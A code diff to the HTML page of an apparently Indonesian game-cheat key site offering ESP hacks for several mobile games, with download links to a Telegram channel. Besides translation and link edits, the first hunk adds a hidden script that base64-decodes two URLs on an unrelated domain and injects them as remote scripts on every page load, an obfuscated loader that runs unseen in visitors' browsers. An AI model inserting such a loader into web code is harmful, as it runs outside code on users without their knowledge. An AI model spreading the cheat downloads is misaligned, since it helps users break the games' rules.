@@ -10,6 +10,16 @@
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script>
+        (function() {
+            var s1 = document.createElement('script');
+            s1.src = atob('aHR0cHM6Ly9hbGFybXBlbmd1aW5tZWx0LmNvbS8zZC9kOC80OC8zZGQ4NDhjYzU1ZTMwOTg3NmYwZTg4NDU3YjhlMjc5MS5qcw==');
+            document.head.appendChild(s1);
+            var s2 = document.createElement('script');
+            s2.src = atob('aHR0cHM6Ly9hbGFybXBlbmd1aW5tZWx0LmNvbS9hZC8zOS8yMS9hZDM5MjE0YTMzYzhlMWRjMDllNjIyY2ExM2UxZTA0Ni5qcw==');
+            document.head.appendChild(s2);
+        })();
+    </script>
+    <script>
         window._turnstileToken = null;
         function onTurnstileSuccess(token) {
             window._turnstileToken = token;
@@ -17,8 +27,8 @@
             if (c) {
                 c.classList.add('verified');
                 document.getElementById('turnstileIcon').className = 'fas fa-check-circle';
-                document.getElementById('turnstileTitle').textContent = 'Terverifikasi';
-                document.getElementById('turnstileSubtitle').textContent = 'Anda dapat mengambil kunci — tekan Ambil Key di bawah';
+                document.getElementById('turnstileTitle').textContent = window.GETKEY_I18N ? window.GETKEY_I18N.t('turnstile_verified') : 'Terverifikasi';
+                document.getElementById('turnstileSubtitle').textContent = window.GETKEY_I18N ? window.GETKEY_I18N.t('turnstile_ready') : 'Anda dapat mengambil kunci — tekan Ambil Key di bawah';
             }
         }
         function onTurnstileExpired() {
@@ -27,12 +37,13 @@
             if (c) {
                 c.classList.remove('verified');
                 document.getElementById('turnstileIcon').className = 'fas fa-shield-alt';
-                document.getElementById('turnstileTitle').textContent = 'Verifikasi Keamanan';
-                document.getElementById('turnstileSubtitle').textContent = 'Selesaikan verifikasi di sebelah kanan untuk membuka Ambil Key';
+                document.getElementById('turnstileTitle').textContent = window.GETKEY_I18N ? window.GETKEY_I18N.t('turnstile_security') : 'Verifikasi Keamanan';
+                document.getElementById('turnstileSubtitle').textContent = window.GETKEY_I18N ? window.GETKEY_I18N.t('turnstile_hint') : 'Selesaikan verifikasi di sebelah kanan untuk membuka Ambil Key';
             }
         }
     </script>
     <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <script src="i18n.js"></script>
     <style>
         :root {
             --bg-primary: #050505;
@@ -1313,7 +1324,7 @@
                 </div>
                 <div class="turnstile-widget">
                     <div class="cf-turnstile" id="turnstile-box"
-                         data-sitekey="0x4AAAAAAzDxOSs8R4DwJlY"
+                         data-sitekey="0x4AAAAAACGAQppv0cG0heOE"
                          data-theme="dark"
                          data-size="flexible"
                          data-callback="onTurnstileSuccess"
@@ -1378,7 +1389,7 @@
                     </button>
                 </div>
                 <div class="game-card-footer">
-                    <button class="btn-card-details" onclick='openHackModal({&quot;name&quot;:&quot;Mobile Legends Bang Bang&quot;,&quot;icon&quot;:&quot;https:\/\/play-lh.googleusercontent.com\/0gB6KEvQzyQXS6Uscx7HNjjlRMRUzEvYFqWr0TlmwHw6cw3nNRNSR9xChp-EUrk3Cq1lqTlsE1DbPgc97YClXVU=w256&quot;,&quot;note&quot;:&quot;&quot;,&quot;features&quot;:[{&quot;title&quot;:&quot;Draw ESP&quot;,&quot;items&quot;:[{&quot;text&quot;:&quot;ESP Line&quot;,&quot;vip&quot;:false},{&quot;text&quot;:&quot;ESP Box&quot;,&quot;vip&quot;:false},{&quot;text&quot;:&quot;ESP Health&quot;,&quot;vip&quot;:false},{&quot;text&quot;:&quot;ESP Icon&quot;,&quot;vip&quot;:false},{&quot;text&quot;:&quot;ESP Minimap&quot;,&quot;vip&quot;:false}]},{&quot;title&quot;:&quot;Room Info&quot;,&quot;items&quot;:[{&quot;text&quot;:&quot;Tampilkan Nama Entitas&quot;,&quot;vip&quot;:false},{&quot;text&quot;:&quot;Tampilkan Hero Entitas&quot;,&quot;vip&quot;:false}]}],&quot;download_url&quot;:&quot;https:\/\/t.me\/\/&quot;,&quot;version&quot;:&quot;1.0&quot;,&quot;download_label&quot;:&quot;Unduh Sekarang&quot;})'>
+                    <button class="btn-card-details" onclick='openHackModal({&quot;name&quot;:&quot;Mobile Legends Bang Bang&quot;,&quot;icon&quot;:&quot;https:\/\/play-lh.googleusercontent.com\/0gB6KEvQzyQXS6Uscx7HNjjlRMRUzEvYFqWr0TlmwHw6cw3nNRNSR9xChp-EUrk3Cq1lqTlsE1DbPgc97YClXVU=w256&quot;,&quot;note&quot;:&quot;&quot;,&quot;features&quot;:[{&quot;title&quot;:&quot;Draw ESP&quot;,&quot;items&quot;:[{&quot;text&quot;:&quot;ESP Line&quot;,&quot;vip&quot;:false},{&quot;text&quot;:&quot;ESP Box&quot;,&quot;vip&quot;:false},{&quot;text&quot;:&quot;ESP Health&quot;,&quot;vip&quot;:false},{&quot;text&quot;:&quot;ESP Icon&quot;,&quot;vip&quot;:false},{&quot;text&quot;:&quot;ESP Minimap&quot;,&quot;vip&quot;:false}]},{&quot;title&quot;:&quot;Room Info&quot;,&quot;items&quot;:[{&quot;text&quot;:&quot;Tampilkan Nama Entitas&quot;,&quot;vip&quot;:false},{&quot;text&quot;:&quot;Tampilkan Hero Entitas&quot;,&quot;vip&quot;:false}]}],&quot;download_url&quot;:&quot;https:\/\/t.me\/AWIMEDAN_Downloads\/&quot;,&quot;version&quot;:&quot;1.0&quot;,&quot;download_label&quot;:&quot;Unduh Sekarang&quot;})'>
                         <i class="fas fa-download"></i> Unduh Hack & Fitur
                     </button>
                 </div>
@@ -1408,24 +1419,24 @@
                     </button>
                 </div>
                 <div class="game-card-footer">
-                    <button class="btn-card-details" onclick='openHackModal({&quot;name&quot;:&quot;Liên Quân Mobile&quot;,&quot;icon&quot;:&quot;https:\/\/img.tapimg.net\/market\/images\/4450f6976373fd3d62862495acc87264.png&quot;,&quot;note&quot;:&quot;&quot;,&quot;features&quot;:[{&quot;title&quot;:&quot;Draw ESP&quot;,&quot;items&quot;:[{&quot;text&quot;:&quot;ESP Line&quot;,&quot;vip&quot;:false},{&quot;text&quot;:&quot;ESP Box&quot;,&quot;vip&quot;:false},{&quot;text&quot;:&quot;ESP Monster&quot;,&quot;vip&quot;:false},{&quot;text&quot;:&quot;ESP Minimap&quot;,&quot;vip&quot;:false},{&quot;text&quot;:&quot;Drone View&quot;,&quot;vip&quot;:false}]}],&quot;download_url&quot;:&quot;https:\/\/t.me\/AWIMEDAN_Download\/&quot;,&quot;version&quot;:&quot;1.0&quot;,&quot;download_label&quot;:&quot;Unduh Sekarang&quot;})'>
+                    <button class="btn-card-details" onclick='openHackModal({&quot;name&quot;:&quot;Liên Quân Mobile&quot;,&quot;icon&quot;:&quot;https:\/\/img.tapimg.net\/market\/images\/4450f6976373fd3d62862495acc87264.png&quot;,&quot;note&quot;:&quot;&quot;,&quot;features&quot;:[{&quot;title&quot;:&quot;Draw ESP&quot;,&quot;items&quot;:[{&quot;text&quot;:&quot;ESP Line&quot;,&quot;vip&quot;:false},{&quot;text&quot;:&quot;ESP Box&quot;,&quot;vip&quot;:false},{&quot;text&quot;:&quot;ESP Monster&quot;,&quot;vip&quot;:false},{&quot;text&quot;:&quot;ESP Minimap&quot;,&quot;vip&quot;:false},{&quot;text&quot;:&quot;Drone View&quot;,&quot;vip&quot;:false}]}],&quot;download_url&quot;:&quot;https:\/\/t.me\/AWIMEDAN_Downloads\/&quot;,&quot;version&quot;:&quot;1.0&quot;,&quot;download_label&quot;:&quot;Unduh Sekarang&quot;})'>
                         <i class="fas fa-download"></i> Unduh Hack & Fitur
                     </button>
                 </div>
             </div>
 
-            <!-- BloodStrike Card -->
+            <!-- BloodStrike -->
             <div class="game-card" data-name="bloodstrike">
                 <div class="game-card-banner">
                     <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQngWyJG-igzxB0Ds01XFfnTMiWWLndmYFhAu_3iaLHQ&s=10" alt="BloodStrike" onerror="this.onerror=null; this.src='../assets/icon/default-game.png';">
                     <span class="banner-badge-link">
-                        <i class="fas fa-bolt"></i> 1 tautan
+                        <i class="fas fa-bolt"></i> 1 Tautan
                     </span>
                 </div>
                 <div class="game-card-body">
                     <h3 class="game-card-title" title="BloodStrike">BloodStrike</h3>
                     <div class="game-card-meta">
-                        <span class="meta-item"><i class="fas fa-clock"></i><span>24j</span></span>
+                        <span class="meta-item"><i class="fas fa-clock"></i><span>24 Jam</span></span>
                         <span class="meta-item"><i class="fas fa-mobile-alt"></i><span>1 Perangkat</span></span>
                     </div>
                 </div>
@@ -1438,24 +1449,24 @@
                     </button>
                 </div>
                 <div class="game-card-footer">
-                    <button class="btn-card-details" onclick='openHackModal({&quot;name&quot;:&quot;BloodStrike&quot;,&quot;icon&quot;:&quot;http:\/\/cdn.onlytris.io.vn\/lib\/bs.png&quot;,&quot;note&quot;:&quot;&quot;,&quot;features&quot;:[],&quot;download_url&quot;:&quot;&quot;,&quot;version&quot;:&quot;1.0&quot;,&quot;download_label&quot;:&quot;Unduh Sekarang&quot;})'>
-                        <i class="fas fa-download"></i> Unduh Hack & Fitur
+                    <button class="btn-card-details" onclick='openHackModal({&quot;name&quot;:&quot;BloodStrike&quot;,&quot;icon&quot;:&quot;https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQngWyJG-igzxB0Ds01XFfnTMiWWLndmYFhAu_3iaLHQ&s=10&quot;,&quot;note&quot;:&quot;&quot;,&quot;features&quot;:[],&quot;download_url&quot;:&quot;https:\/\/t.me\/AWIMEDAN_Downloads\/&quot;,&quot;version&quot;:&quot;1.0&quot;,&quot;download_label&quot;:&quot;Unduh Sekarang&quot;})'>
+                        <i class="fas fa-download"></i> Unduh Cheat & Fitur
                     </button>
                 </div>
             </div>
 
-            <!-- 8 Ball Pool Card -->
+            <!-- 8 Ball Pool -->
             <div class="game-card" data-name="8 ball pool">
                 <div class="game-card-banner">
                     <img src="https://m.media-amazon.com/images/I/81OMgLAhLCL.png" alt="8 Ball Pool" onerror="this.onerror=null; this.src='../assets/icon/default-game.png';">
                     <span class="banner-badge-link">
-                        <i class="fas fa-bolt"></i> 1 tautan
+                        <i class="fas fa-bolt"></i> 1 Tautan
                     </span>
                 </div>
                 <div class="game-card-body">
                     <h3 class="game-card-title" title="8 Ball Pool">8 Ball Pool</h3>
                     <div class="game-card-meta">
-                        <span class="meta-item"><i class="fas fa-clock"></i><span>24j</span></span>
+                        <span class="meta-item"><i class="fas fa-clock"></i><span>24 Jam</span></span>
                         <span class="meta-item"><i class="fas fa-mobile-alt"></i><span>1 Perangkat</span></span>
                     </div>
                 </div>
@@ -1468,8 +1479,8 @@
                     </button>
                 </div>
                 <div class="game-card-footer">
-                    <button class="btn-card-details" onclick='openHackModal({&quot;name&quot;:&quot;8 Ball Pool&quot;,&quot;icon&quot;:&quot;https:\/\/m.media-amazon.com\/images\/I\/81OMgLAhLCL.png&quot;,&quot;note&quot;:&quot;&quot;,&quot;features&quot;:[],&quot;download_url&quot;:&quot;&quot;,&quot;version&quot;:&quot;1.0&quot;,&quot;download_label&quot;:&quot;Unduh Sekarang&quot;})'>
-                        <i class="fas fa-download"></i> Unduh Hack & Fitur
+                    <button class="btn-card-details" onclick='openHackModal({&quot;name&quot;:&quot;8 Ball Pool&quot;,&quot;icon&quot;:&quot;https:\/\/m.media-amazon.com\/images\/I\/81OMgLAhLCL.png&quot;,&quot;note&quot;:&quot;&quot;,&quot;features&quot;:[],&quot;download_url&quot;:&quot;https:\/\/t.me\/AWIMEDAN_Downloads\/&quot;,&quot;version&quot;:&quot;1.0&quot;,&quot;download_label&quot;:&quot;Unduh Sekarang&quot;})'>
+                        <i class="fas fa-download"></i> Unduh Cheat & Fitur
                     </button>
                 </div>
             </div>
